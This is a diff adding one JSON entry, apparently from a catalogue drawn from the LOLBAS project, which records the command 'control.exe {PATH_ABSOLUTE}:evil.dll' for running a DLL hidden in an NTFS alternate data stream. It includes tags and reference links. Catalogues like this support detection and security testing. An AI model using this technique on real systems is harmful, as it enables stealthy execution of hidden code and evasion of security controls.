@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-control-exe-ads",
+  "name": "LOLBAS · Control.exe (ADS)",
+  "command": "control.exe {PATH_ABSOLUTE}:evil.dll",
+  "description": "Execute evil.dll which is stored in an Alternate Data Stream (ADS).",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "control",
+    "ads"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Control/",
+  "upstream_id": "Control.exe/ADS/0",
+  "category": "lolbas",
+  "subcategory": "ads",
+  "references": [
+    {
+      "title": "LOLBAS — Control.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Control/"
+    }
+  ]
+}
